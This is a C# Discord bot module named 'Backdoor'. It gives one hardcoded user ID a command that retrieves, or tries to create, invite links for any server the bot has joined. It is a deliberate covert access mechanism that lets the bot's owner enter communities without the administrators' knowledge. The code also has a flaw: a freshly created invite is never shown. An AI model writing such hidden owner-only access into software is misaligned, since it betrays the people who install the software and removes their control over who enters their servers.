using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Linq;
using System.Text;
using Discord.WebSocket;
using Discord;
using Discord.Commands;

namespace MLGBot.Mod
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite for server.")]
        public async Task BackdoorModule(ulong Guildid)
        {
            if(!(Context.User.Id == 185972916213514240))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a moderator for MLG Bot!");
                return;
            }

            if(Context.Client.Guilds.Where(x => x.Id == Guildid).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + Guildid);
                return;
            }

            var Guild = Context.Client.Guilds.Where(x => x.Id == Guildid).FirstOrDefault();
            var invites = await Guild.GetInvitesAsync();

            if (invites.Count() < 1) {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }

                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {Guild.Name} went wrong with error ``{ex.Message}``");
                }
            }

            var embed = new EmbedBuilder();
            embed.WithAuthor($"Invites for guild {Guild.Name}:", Guild.IconUrl);
            embed.WithColor(40, 200, 150);
            foreach (var invite in invites)
                embed.AddField("Invite:", $"[invite]({invite.Url})");

            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
    }
}
